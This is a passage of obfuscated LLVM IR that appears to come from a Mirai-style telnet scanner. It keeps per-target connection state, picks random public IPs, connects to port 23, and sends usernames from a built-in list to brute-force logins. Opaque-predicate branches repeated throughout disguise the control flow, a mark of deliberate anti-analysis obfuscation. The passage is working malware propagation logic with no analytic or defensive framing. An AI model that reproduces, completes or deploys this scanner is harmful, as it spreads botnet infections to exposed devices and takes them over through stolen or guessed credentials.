  %111 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %112 = load i32, i32* %5, align 4
  %113 = sext i32 %112 to i64
  %114 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %113
  %115 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %114, i32 0, i32 7
  store i32 %111, i32* %115, align 16
  %116 = load i32, i32* @x.79
  %117 = load i32, i32* @y.80
  %118 = sub i32 %116, 1
  %119 = mul i32 %116, %118
  %120 = urem i32 %119, 2
  %121 = icmp eq i32 %120, 0
  %122 = icmp slt i32 %117, 10
  %123 = or i1 %121, %122
  br i1 %123, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %124

; <label>:124:                                    ; preds = %originalBBpart24, %95
  %125 = load i32, i32* %5, align 4
  %126 = sext i32 %125 to i64
  %127 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %126
  %128 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %127, i32 0, i32 2
  %129 = load i8, i8* %128, align 8
  %130 = zext i8 %129 to i32
  switch i32 %130, label %1104 [
    i32 0, label %131
    i32 1, label %315
    i32 2, label %477
    i32 3, label %538
    i32 4, label %631
    i32 5, label %724
    i32 6, label %817
    i32 7, label %995
  ]

; <label>:131:                                    ; preds = %124
  %132 = load i32, i32* %5, align 4
  %133 = sext i32 %132 to i64
  %134 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %133
  %135 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %134, i32 0, i32 3
  %136 = load i8, i8* %135, align 1
  %137 = zext i8 %136 to i32
  %138 = icmp eq i32 %137, 1
  br i1 %138, label %139, label %159

; <label>:139:                                    ; preds = %131
  %140 = load i32, i32* %5, align 4
  %141 = sext i32 %140 to i64
  %142 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %141
  %143 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %142, i32 0, i32 9
  %144 = load i8*, i8** %143, align 8
  store i8* %144, i8** %20, align 8
  %145 = load i32, i32* %5, align 4
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %146
  %148 = bitcast %struct.telstate_t* %147 to i8*
  call void @llvm.memset.p0i8.i64(i8* %148, i8 0, i64 32, i32 16, i1 false)
  %149 = load i8*, i8** %20, align 8
  %150 = load i32, i32* %5, align 4
  %151 = sext i32 %150 to i64
  %152 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %151
  %153 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %152, i32 0, i32 9
  store i8* %149, i8** %153, align 8
  %154 = call i32 @GetRandomPublicIP()
  %155 = load i32, i32* %5, align 4
  %156 = sext i32 %155 to i64
  %157 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %156
  %158 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %157, i32 0, i32 1
  store i32 %154, i32* %158, align 4
  br label %223

; <label>:159:                                    ; preds = %131
  %160 = load i32, i32* @x.79
  %161 = load i32, i32* @y.80
  %162 = sub i32 %160, 1
  %163 = mul i32 %160, %162
  %164 = urem i32 %163, 2
  %165 = icmp eq i32 %164, 0
  %166 = icmp slt i32 %161, 10
  %167 = or i1 %165, %166
  br i1 %167, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %159
  %168 = load i32, i32* %5, align 4
  %169 = sext i32 %168 to i64
  %170 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %169
  %171 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %170, i32 0, i32 3
  %172 = load i8, i8* %171, align 1
  %173 = zext i8 %172 to i32
  %174 = icmp eq i32 %173, 0
  %175 = load i32, i32* @x.79
  %176 = load i32, i32* @y.80
  %177 = sub i32 %175, 1
  %178 = mul i32 %175, %177
  %179 = urem i32 %178, 2
  %180 = icmp eq i32 %179, 0
  %181 = icmp slt i32 %176, 10
  %182 = or i1 %180, %181
  br i1 %182, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %174, label %183, label %222

; <label>:183:                                    ; preds = %originalBBpart28
  %184 = load i32, i32* %5, align 4
  %185 = sext i32 %184 to i64
  %186 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %185
  %187 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %186, i32 0, i32 5
  %188 = load i8, i8* %187, align 1
  %189 = add i8 %188, 1
  store i8 %189, i8* %187, align 1
  %190 = load i32, i32* %5, align 4
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %191
  %193 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %192, i32 0, i32 4
  %194 = load i8, i8* %193, align 2
  %195 = add i8 %194, 1
  store i8 %195, i8* %193, align 2
  %196 = load i32, i32* %5, align 4
  %197 = sext i32 %196 to i64
  %198 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %197
  %199 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %198, i32 0, i32 5
  %200 = load i8, i8* %199, align 1
  %201 = zext i8 %200 to i64
  %202 = icmp eq i64 %201, 9
  br i1 %202, label %203, label %208

; <label>:203:                                    ; preds = %183
  %204 = load i32, i32* %5, align 4
  %205 = sext i32 %204 to i64
  %206 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %205
  %207 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %206, i32 0, i32 3
  store i8 1, i8* %207, align 1
  br label %1121

; <label>:208:                                    ; preds = %183
  %209 = load i32, i32* %5, align 4
  %210 = sext i32 %209 to i64
  %211 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %210
  %212 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %211, i32 0, i32 4
  %213 = load i8, i8* %212, align 2
  %214 = zext i8 %213 to i64
  %215 = icmp eq i64 %214, 9
  br i1 %215, label %216, label %221

; <label>:216:                                    ; preds = %208
  %217 = load i32, i32* %5, align 4
  %218 = sext i32 %217 to i64
  %219 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %218
  %220 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %219, i32 0, i32 3
  store i8 1, i8* %220, align 1
  br label %1121

; <label>:221:                                    ; preds = %208
  br label %222

; <label>:222:                                    ; preds = %221, %originalBBpart28
  br label %223

; <label>:223:                                    ; preds = %222, %139
  %224 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %224, align 4
  %225 = call zeroext i16 @htons(i16 zeroext 23) #13
  %226 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %225, i16* %226, align 2
  %227 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %228 = getelementptr inbounds [8 x i8], [8 x i8]* %227, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %228, i8 0, i64 8, i32 4, i1 false)
  %229 = load i32, i32* %5, align 4
  %230 = sext i32 %229 to i64
  %231 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %230
  %232 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %231, i32 0, i32 1
  %233 = load i32, i32* %232, align 4
  %234 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 2
  %235 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %234, i32 0, i32 0
  store i32 %233, i32* %235, align 4
  %236 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %237 = load i32, i32* %5, align 4
  %238 = sext i32 %237 to i64
  %239 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %238
  %240 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %239, i32 0, i32 0
  store i32 %236, i32* %240, align 16
  %241 = load i32, i32* %5, align 4
  %242 = sext i32 %241 to i64
  %243 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %242
  %244 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %243, i32 0, i32 0
  %245 = load i32, i32* %244, align 16
  %246 = icmp eq i32 %245, -1
  br i1 %246, label %247, label %264

; <label>:247:                                    ; preds = %223
  %248 = load i32, i32* @x.79
  %249 = load i32, i32* @y.80
  %250 = sub i32 %248, 1
  %251 = mul i32 %248, %250
  %252 = urem i32 %251, 2
  %253 = icmp eq i32 %252, 0
  %254 = icmp slt i32 %249, 10
  %255 = or i1 %253, %254
  br i1 %255, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %247
  %256 = load i32, i32* @x.79
  %257 = load i32, i32* @y.80
  %258 = sub i32 %256, 1
  %259 = mul i32 %256, %258
  %260 = urem i32 %259, 2
  %261 = icmp eq i32 %260, 0
  %262 = icmp slt i32 %257, 10
  %263 = or i1 %261, %262
  br i1 %263, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %1121

; <label>:264:                                    ; preds = %223
  %265 = load i32, i32* @x.79
  %266 = load i32, i32* @y.80
  %267 = sub i32 %265, 1
  %268 = mul i32 %265, %267
  %269 = urem i32 %268, 2
  %270 = icmp eq i32 %269, 0
  %271 = icmp slt i32 %266, 10
  %272 = or i1 %270, %271
  br i1 %272, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %264
  %273 = load i32, i32* %5, align 4
  %274 = sext i32 %273 to i64
  %275 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %274
  %276 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %275, i32 0, i32 0
  %277 = load i32, i32* %276, align 16
  %278 = load i32, i32* %5, align 4
  %279 = sext i32 %278 to i64
  %280 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %279
  %281 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %280, i32 0, i32 0
  %282 = load i32, i32* %281, align 16
  %283 = call i32 (i32, i32, ...) @fcntl(i32 %282, i32 3, i8* null)
  %284 = or i32 %283, 2048
  %285 = call i32 (i32, i32, ...) @fcntl(i32 %277, i32 4, i32 %284)
  %286 = load i32, i32* %5, align 4
  %287 = sext i32 %286 to i64
  %288 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %287
  %289 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %288, i32 0, i32 0
  %290 = load i32, i32* %289, align 16
  %291 = bitcast %struct.sockaddr_in* %18 to %struct.sockaddr*
  %292 = call i32 @connect(i32 %290, %struct.sockaddr* %291, i32 16)
  %293 = icmp eq i32 %292, -1
  %294 = load i32, i32* @x.79
  %295 = load i32, i32* @y.80
  %296 = sub i32 %294, 1
  %297 = mul i32 %294, %296
  %298 = urem i32 %297, 2
  %299 = icmp eq i32 %298, 0
  %300 = icmp slt i32 %295, 10
  %301 = or i1 %299, %300
  br i1 %301, label %originalBBpart223, label %originalBB14alteredBB

originalBBpart223:                                ; preds = %originalBB14
  br i1 %293, label %302, label %310

; <label>:302:                                    ; preds = %originalBBpart223
  %303 = call i32* @__errno_location() #13
  %304 = load i32, i32* %303, align 4
  %305 = icmp ne i32 %304, 115
  br i1 %305, label %306, label %310

; <label>:306:                                    ; preds = %302
  %307 = load i32, i32* %5, align 4
  %308 = sext i32 %307 to i64
  %309 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %308
  call void @reset_telstate(%struct.telstate_t* %309)
  br label %314

; <label>:310:                                    ; preds = %302, %originalBBpart223
  %311 = load i32, i32* %5, align 4
  %312 = sext i32 %311 to i64
  %313 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %312
  call void @advance_state(%struct.telstate_t* %313, i32 1)
  br label %314

; <label>:314:                                    ; preds = %310, %306
  br label %1104

; <label>:315:                                    ; preds = %124
  br label %316

; <label>:316:                                    ; preds = %315
  %317 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %12, i32 0, i32 0
  %318 = getelementptr inbounds [16 x i64], [16 x i64]* %317, i64 0, i64 0
  %319 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %318) #2, !srcloc !6
  %320 = extractvalue { i64, i64* } %319, 0
  %321 = extractvalue { i64, i64* } %319, 1
  %322 = trunc i64 %320 to i32
  store i32 %322, i32* %21, align 4
  %323 = ptrtoint i64* %321 to i64
  %324 = trunc i64 %323 to i32
  store i32 %324, i32* %22, align 4
  br label %325

; <label>:325:                                    ; preds = %316
  %326 = load i32, i32* @x.79
  %327 = load i32, i32* @y.80
  %328 = sub i32 %326, 1
  %329 = mul i32 %326, %328
  %330 = urem i32 %329, 2
  %331 = icmp eq i32 %330, 0
  %332 = icmp slt i32 %327, 10
  %333 = or i1 %331, %332
  br i1 %333, label %originalBB25, label %originalBB25alteredBB

originalBB25:                                     ; preds = %originalBB25alteredBB, %325
  %334 = load i32, i32* @x.79
  %335 = load i32, i32* @y.80
  %336 = sub i32 %334, 1
  %337 = mul i32 %334, %336
  %338 = urem i32 %337, 2
  %339 = icmp eq i32 %338, 0
  %340 = icmp slt i32 %335, 10
  %341 = or i1 %339, %340
  br i1 %341, label %originalBBpart227, label %originalBB25alteredBB

originalBBpart227:                                ; preds = %originalBB25
  br label %342

; <label>:342:                                    ; preds = %originalBBpart227
  %343 = load i32, i32* %5, align 4
  %344 = sext i32 %343 to i64
  %345 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %344
  %346 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %345, i32 0, i32 0
  %347 = load i32, i32* %346, align 16
  %348 = srem i32 %347, 64
  %349 = zext i32 %348 to i64
  %350 = shl i64 1, %349
  %351 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %12, i32 0, i32 0
  %352 = load i32, i32* %5, align 4
  %353 = sext i32 %352 to i64
  %354 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %353
  %355 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %354, i32 0, i32 0
  %356 = load i32, i32* %355, align 16
  %357 = sdiv i32 %356, 64
  %358 = sext i32 %357 to i64
  %359 = getelementptr inbounds [16 x i64], [16 x i64]* %351, i64 0, i64 %358
  %360 = load i64, i64* %359, align 8
  %361 = or i64 %360, %350
  store i64 %361, i64* %359, align 8
  %362 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 0
  store i64 0, i64* %362, align 8
  %363 = load i32, i32* %3, align 4
  %364 = sext i32 %363 to i64
  %365 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 1
  store i64 %364, i64* %365, align 8
  %366 = load i32, i32* %5, align 4
  %367 = sext i32 %366 to i64
  %368 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %367
  %369 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %368, i32 0, i32 0
  %370 = load i32, i32* %369, align 16
  %371 = add nsw i32 %370, 1
  %372 = call i32 @select(i32 %371, %struct.__sigset_t* null, %struct.__sigset_t* %12, %struct.__sigset_t* null, %struct.timeval* %13)
  store i32 %372, i32* %6, align 4
  %373 = load i32, i32* %6, align 4
  %374 = icmp eq i32 %373, 1
  br i1 %374, label %375, label %423

; <label>:375:                                    ; preds = %342
  store i32 4, i32* %14, align 4
  store i32 0, i32* %15, align 4
  %376 = load i32, i32* %5, align 4
  %377 = sext i32 %376 to i64
  %378 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %377
  %379 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %378, i32 0, i32 0
  %380 = load i32, i32* %379, align 16
  %381 = bitcast i32* %15 to i8*
  %382 = call i32 @getsockopt(i32 %380, i32 1, i32 4, i8* %381, i32* %14) #2
  %383 = load i32, i32* %15, align 4
  %384 = icmp ne i32 %383, 0
  br i1 %384, label %385, label %405

; <label>:385:                                    ; preds = %375
  %386 = load i32, i32* @x.79
  %387 = load i32, i32* @y.80
  %388 = sub i32 %386, 1
  %389 = mul i32 %386, %388
  %390 = urem i32 %389, 2
  %391 = icmp eq i32 %390, 0
  %392 = icmp slt i32 %387, 10
  %393 = or i1 %391, %392
  br i1 %393, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %385
  %394 = load i32, i32* %5, align 4
  %395 = sext i32 %394 to i64
  %396 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %395
  call void @reset_telstate(%struct.telstate_t* %396)
  %397 = load i32, i32* @x.79
  %398 = load i32, i32* @y.80
  %399 = sub i32 %397, 1
  %400 = mul i32 %397, %399
  %401 = urem i32 %400, 2
  %402 = icmp eq i32 %401, 0
  %403 = icmp slt i32 %398, 10
  %404 = or i1 %402, %403
  br i1 %404, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  br label %422

; <label>:405:                                    ; preds = %375
  %406 = load i32, i32* %5, align 4
  %407 = sext i32 %406 to i64
  %408 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %407
  %409 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %408, i32 0, i32 0
  %410 = load i32, i32* %409, align 16
  %411 = load i32, i32* %5, align 4
  %412 = sext i32 %411 to i64
  %413 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %412
  %414 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %413, i32 0, i32 0
  %415 = load i32, i32* %414, align 16
  %416 = call i32 (i32, i32, ...) @fcntl(i32 %415, i32 3, i8* null)
  %417 = and i32 %416, -2049
  %418 = call i32 (i32, i32, ...) @fcntl(i32 %410, i32 4, i32 %417)
  %419 = load i32, i32* %5, align 4
  %420 = sext i32 %419 to i64
  %421 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %420
  call void @advance_state(%struct.telstate_t* %421, i32 2)
  br label %422

; <label>:422:                                    ; preds = %405, %originalBBpart231
  br label %1121

; <label>:423:                                    ; preds = %342
  %424 = load i32, i32* %6, align 4
  %425 = icmp eq i32 %424, -1
  br i1 %425, label %426, label %430

; <label>:426:                                    ; preds = %423
  %427 = load i32, i32* %5, align 4
  %428 = sext i32 %427 to i64
  %429 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %428
  call void @reset_telstate(%struct.telstate_t* %429)
  br label %1121

; <label>:430:                                    ; preds = %423
  br label %431

; <label>:431:                                    ; preds = %430
  %432 = load i32, i32* %5, align 4
  %433 = sext i32 %432 to i64
  %434 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %433
  %435 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %434, i32 0, i32 7
  %436 = load i32, i32* %435, align 16
  %437 = add i32 %436, 5
  %438 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %439 = icmp ult i32 %437, %438
  br i1 %439, label %440, label %460

; <label>:440:                                    ; preds = %431
  %441 = load i32, i32* @x.79
  %442 = load i32, i32* @y.80
  %443 = sub i32 %441, 1
  %444 = mul i32 %441, %443
  %445 = urem i32 %444, 2
  %446 = icmp eq i32 %445, 0
  %447 = icmp slt i32 %442, 10
  %448 = or i1 %446, %447
  br i1 %448, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %440
  %449 = load i32, i32* %5, align 4
  %450 = sext i32 %449 to i64
  %451 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %450
  call void @reset_telstate(%struct.telstate_t* %451)
  %452 = load i32, i32* @x.79
  %453 = load i32, i32* @y.80
  %454 = sub i32 %452, 1
  %455 = mul i32 %452, %454
  %456 = urem i32 %455, 2
  %457 = icmp eq i32 %456, 0
  %458 = icmp slt i32 %453, 10
  %459 = or i1 %457, %458
  br i1 %459, label %originalBBpart235, label %originalBB33alteredBB

originalBBpart235:                                ; preds = %originalBB33
  br label %460

; <label>:460:                                    ; preds = %originalBBpart235, %431
  %461 = load i32, i32* @x.79
  %462 = load i32, i32* @y.80
  %463 = sub i32 %461, 1
  %464 = mul i32 %461, %463
  %465 = urem i32 %464, 2
  %466 = icmp eq i32 %465, 0
  %467 = icmp slt i32 %462, 10
  %468 = or i1 %466, %467
  br i1 %468, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %460
  %469 = load i32, i32* @x.79
  %470 = load i32, i32* @y.80
  %471 = sub i32 %469, 1
  %472 = mul i32 %469, %471
  %473 = urem i32 %472, 2
  %474 = icmp eq i32 %473, 0
  %475 = icmp slt i32 %470, 10
  %476 = or i1 %474, %475
  br i1 %476, label %originalBBpart239, label %originalBB37alteredBB

originalBBpart239:                                ; preds = %originalBB37
  br label %1104

; <label>:477:                                    ; preds = %124
  %478 = load i32, i32* %5, align 4
  %479 = sext i32 %478 to i64
  %480 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %479
  %481 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %480, i32 0, i32 0
  %482 = load i32, i32* %481, align 16
  %483 = load i32, i32* %3, align 4
  %484 = load i32, i32* %5, align 4
  %485 = sext i32 %484 to i64
  %486 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %485
  %487 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %486, i32 0, i32 9
  %488 = load i8*, i8** %487, align 8
  %489 = call i32 @read_until_response(i32 %482, i32 %483, i8* %488, i32 1024, i8** getelementptr inbounds ([5 x i8*], [5 x i8*]* @advances, i32 0, i32 0))
  %490 = icmp ne i32 %489, 0
  br i1 %490, label %491, label %508

; <label>:491:                                    ; preds = %477
  %492 = load i32, i32* %5, align 4
  %493 = sext i32 %492 to i64
  %494 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %493
  %495 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %494, i32 0, i32 9
  %496 = load i8*, i8** %495, align 8
  %497 = call i32 @contains_fail(i8* %496)
  %498 = icmp ne i32 %497, 0
  br i1 %498, label %499, label %503

; <label>:499:                                    ; preds = %491
  %500 = load i32, i32* %5, align 4
  %501 = sext i32 %500 to i64
  %502 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %501
  call void @advance_state(%struct.telstate_t* %502, i32 0)
  br label %507

; <label>:503:                                    ; preds = %491
  %504 = load i32, i32* %5, align 4
  %505 = sext i32 %504 to i64
  %506 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %505
  call void @advance_state(%struct.telstate_t* %506, i32 3)
  br label %507

; <label>:507:                                    ; preds = %503, %499
  br label %1121

; <label>:508:                                    ; preds = %477
  %509 = load i32, i32* @x.79
  %510 = load i32, i32* @y.80
  %511 = sub i32 %509, 1
  %512 = mul i32 %509, %511
  %513 = urem i32 %512, 2
  %514 = icmp eq i32 %513, 0
  %515 = icmp slt i32 %510, 10
  %516 = or i1 %514, %515
  br i1 %516, label %originalBB41, label %originalBB41alteredBB

originalBB41:                                     ; preds = %originalBB41alteredBB, %508
  %517 = load i32, i32* %5, align 4
  %518 = sext i32 %517 to i64
  %519 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %518
  %520 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %519, i32 0, i32 7
  %521 = load i32, i32* %520, align 16
  %522 = add i32 %521, 7
  %523 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %524 = icmp ult i32 %522, %523
  %525 = load i32, i32* @x.79
  %526 = load i32, i32* @y.80
  %527 = sub i32 %525, 1
  %528 = mul i32 %525, %527
  %529 = urem i32 %528, 2
  %530 = icmp eq i32 %529, 0
  %531 = icmp slt i32 %526, 10
  %532 = or i1 %530, %531
  br i1 %532, label %originalBBpart253, label %originalBB41alteredBB

originalBBpart253:                                ; preds = %originalBB41
  br i1 %524, label %533, label %537

; <label>:533:                                    ; preds = %originalBBpart253
  %534 = load i32, i32* %5, align 4
  %535 = sext i32 %534 to i64
  %536 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %535
  call void @reset_telstate(%struct.telstate_t* %536)
  br label %537

; <label>:537:                                    ; preds = %533, %originalBBpart253
  br label %1104

; <label>:538:                                    ; preds = %124
  %539 = load i32, i32* @x.79
  %540 = load i32, i32* @y.80
  %541 = sub i32 %539, 1
  %542 = mul i32 %539, %541
  %543 = urem i32 %542, 2
  %544 = icmp eq i32 %543, 0
  %545 = icmp slt i32 %540, 10
  %546 = or i1 %544, %545
  br i1 %546, label %originalBB55, label %originalBB55alteredBB

originalBB55:                                     ; preds = %originalBB55alteredBB, %538
  %547 = load i32, i32* %5, align 4
  %548 = sext i32 %547 to i64
  %549 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %548
  %550 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %549, i32 0, i32 0
  %551 = load i32, i32* %550, align 16
  %552 = load i32, i32* %5, align 4
  %553 = sext i32 %552 to i64
  %554 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %553
  %555 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %554, i32 0, i32 4
  %556 = load i8, i8* %555, align 2
  %557 = zext i8 %556 to i64
  %558 = getelementptr inbounds [9 x i8*], [9 x i8*]* @usernames, i64 0, i64 %557
  %559 = load i8*, i8** %558, align 8
  %560 = load i32, i32* %5, align 4
  %561 = sext i32 %560 to i64
  %562 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %561
  %563 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %562, i32 0, i32 4
  %564 = load i8, i8* %563, align 2
  %565 = zext i8 %564 to i64
  %566 = getelementptr inbounds [9 x i8*], [9 x i8*]* @usernames, i64 0, i64 %565
  %567 = load i8*, i8** %566, align 8
  %568 = call i64 @strlen(i8* %567) #10
  %569 = call i64 @send(i32 %551, i8* %559, i64 %568, i32 16384)
  %570 = icmp slt i64 %569, 0
  %571 = load i32, i32* @x.79
  %572 = load i32, i32* @y.80
  %573 = sub i32 %571, 1
  %574 = mul i32 %571, %573
  %575 = urem i32 %574, 2
  %576 = icmp eq i32 %575, 0
  %577 = icmp slt i32 %572, 10
  %578 = or i1 %576, %577
  br i1 %578, label %originalBBpart257, label %originalBB55alteredBB

originalBBpart257:                                ; preds = %originalBB55
  br i1 %570, label %579, label %583

; <label>:579:                                    ; preds = %originalBBpart257
  %580 = load i32, i32* %5, align 4
  %581 = sext i32 %580 to i64
  %582 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %581
  call void @reset_telstate(%struct.telstate_t* %582)
  br label %1121

; <label>:583:                                    ; preds = %originalBBpart257
  %584 = load i32, i32* @x.79
  %585 = load i32, i32* @y.80
  %586 = sub i32 %584, 1
  %587 = mul i32 %584, %586
  %588 = urem i32 %587, 2
  %589 = icmp eq i32 %588, 0
  %590 = icmp slt i32 %585, 10
  %591 = or i1 %589, %590
  br i1 %591, label %originalBB59, label %originalBB59alteredBB

originalBB59:                                     ; preds = %originalBB59alteredBB, %583
  %592 = load i32, i32* %5, align 4
  %593 = sext i32 %592 to i64
  %594 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %593
  %595 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %594, i32 0, i32 0
  %596 = load i32, i32* %595, align 16
  %597 = call i64 @send(i32 %596, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.347, i32 0, i32 0), i64 2, i32 16384)
  %598 = icmp slt i64 %597, 0
  %599 = load i32, i32* @x.79
  %600 = load i32, i32* @y.80
  %601 = sub i32 %599, 1
  %602 = mul i32 %599, %601
  %603 = urem i32 %602, 2
  %604 = icmp eq i32 %603, 0
  %605 = icmp slt i32 %600, 10
  %606 = or i1 %604, %605
  br i1 %606, label %originalBBpart261, label %originalBB59alteredBB

originalBBpart261:                                ; preds = %originalBB59
  br i1 %598, label %607, label %611

; <label>:607:                                    ; preds = %originalBBpart261
  %608 = load i32, i32* %5, align 4
  %609 = sext i32 %608 to i64
  %610 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %609
  call void @reset_telstate(%struct.telstate_t* %610)
  br label %1121

; <label>:611:                                    ; preds = %originalBBpart261
  %612 = load i32, i32* @x.79
  %613 = load i32, i32* @y.80
  %614 = sub i32 %612, 1
  %615 = mul i32 %612, %614
  %616 = urem i32 %615, 2
  %617 = icmp eq i32 %616, 0
  %618 = icmp slt i32 %613, 10
  %619 = or i1 %617, %618
  br i1 %619, label %originalBB63, label %originalBB63alteredBB

originalBB63:                                     ; preds = %originalBB63alteredBB, %611
  %620 = load i32, i32* %5, align 4
  %621 = sext i32 %620 to i64
  %622 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %621
  call void @advance_state(%struct.telstate_t* %622, i32 4)
  %623 = load i32, i32* @x.79
  %624 = load i32, i32* @y.80
  %625 = sub i32 %623, 1
  %626 = mul i32 %623, %625
  %627 = urem i32 %626, 2
  %628 = icmp eq i32 %627, 0
  %629 = icmp slt i32 %624, 10
  %630 = or i1 %628, %629
